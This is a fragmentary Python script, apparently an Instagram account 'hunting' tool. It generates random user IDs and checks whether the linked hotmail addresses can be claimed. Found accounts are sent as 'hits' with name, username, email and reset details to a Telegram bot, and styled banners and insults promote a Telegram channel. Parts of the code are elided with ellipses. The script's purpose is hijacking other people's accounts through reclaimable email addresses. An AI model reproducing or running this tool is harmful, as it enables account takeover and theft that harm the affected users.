import webbrowser
webbrowser.open("https://t.me/cometobecomesxckers")
try:
...
K3S63 = render('{𝐏𝐈𝐘𝐔𝐒𝐇 𝐗 𝐃𝐄𝐍𝐉𝐈}', colors=['white', 'cyan'], align='center')
print(K3S63)
print('')
R = '\033[1;31;40m'
X = '\033[1;33;40m' 
...
tok = input('• {} 𝐓𝐎𝐊𝐄𝐍 𝐃𝐄 𝐃𝐎 𝐁𝐎𝐒𝐒 {} : {}'.format(R,R,R,R))
print("\r")
iD = input('• {} 𝐈𝐃 𝐁𝐇𝐈 𝐃𝐄 𝐃𝐎 {} : {}'.format(B,C,B,C))
os.system('clear')
requests.get(f"https://api.telegram.org/bot{tok}/sendvideo?chat_id={iD}&video=https://t.me/aboutk3s63/10=>𝒀𝒐𝒖 𝒎𝒖𝒔𝒕 𝒋𝒐𝒊𝒏 https://t.me/cometobecomesxckers 𝒔𝒐 𝒕𝒉𝒂𝒕 𝒕𝒉𝒆 𝒕𝒐𝒐𝒍 𝒓𝒖𝒏𝒔 𝒘𝒊𝒕𝒉𝒐𝒖𝒕 𝒑𝒓𝒐𝒃𝒍𝒆𝒎𝒔.\n> 𝑶𝒏𝒄𝒆 𝒚𝒐𝒖 𝒉𝒂𝒗𝒆 𝒋𝒐𝒊𝒏𝒆𝒅 𝒕𝒉𝒆 𝒄𝒉𝒂𝒏𝒏𝒆𝒍, 𝒆𝒏𝒋𝒐𝒚 𝒉𝒊𝒕𝒔 𝒂𝒏𝒅 𝒔𝒆𝒏𝒅 𝒔𝒄𝒓𝒆𝒆𝒏𝒔 𝒐𝒇 𝒉𝒊𝒕𝒔.&parse_mode=Markdown")
def cookie(email):
...
def hunting(email):	
    ...
    'ig_sig_key_version': '4',
		...
		try:
			...
			name = None
		date = date_sc(Id)			
		requests.post(f"""https://api.telegram.org/bot{tok}/sendvideo?chat_id={iD}&parse_mode=MarkdownV2&video=https://t.me/aboutk3s63/12
""");hunt = ("""

𖢦 𝐇𝐈𝐓 𝐂𝐋𝐀𝐈𝐌 𝐊𝐀𝐑𝐑 𝐋𝐈𝐘𝐎//~ 𖢦
▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
𝐍𝐀𝐌𝐄 : {}
𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : : {}
𝐌𝐀𝐈𝐋 : {}@hotmail.com
...
𝐑𝐄𝐒𝐄𝐓 : {}
▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
𖢦 𝐌𝐔𝐒𝐓 𝐅𝐎𝐋𝐋𝐎𝐖 𝐎𝐍 𝐈𝐆: @𝟕𝐬𝐱𝐠𝐫 // 𝐀𝐍𝐘 𝐏𝐑𝐎𝐁𝐋𝐄𝐌 𝐃𝐌 @g0d_denjii 𖢦
		...
		print(nnn)				
		hunt2 = ("""𖢦 𝐂𝐇𝐔𝐌𝐌𝐄𝐒𝐇𝐖𝐀𝐑𝐈 𝐇𝐈𝐓 𝐋𝐄𝐋𝐎 𖢦
▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
𝐍𝐀𝐌𝐄 : {}
𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : : {}
𝐌𝐀𝐈𝐋 : {}@hotmail.com
...
def check_email(email):
	...
	bo = f'\x1b[38;5;{b}m'
	check+=1
	print(f'''\x1b[1;32m 𝐄𝐗 𝐊𝐈 𝐌𝐊𝐂> {ex ki mkc}\x1b[1;33m 𝐓𝐔𝐌 𝐑𝐎𝐘𝐄 : {tum roye} \x1b[1;36m 𝐍𝐄𝐖 𝐆𝐅 𝐁𝐀𝐍𝐀𝐘𝐄 ➼ { new gf banaye}  \x1b[1;36m 𝐀𝐕𝐎𝐈𝐃 𝐊𝐀𝐑𝐎!!➼      {email}@hotmail.com\x1b[1;32m 𝐉𝐀𝐀𝐍𝐂𝐇! ➼{ jaanch } 
𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗝𝗢𝗜𝗡 𝗞𝗔𝗥𝗥 𝗟𝗢: THE SXCKERS 
       ''')

def rand_ids():  
  Id= str(random.randrange(1,279760000))
  if Id not in ids:
    ids.append(Id)
    return Id
  else:
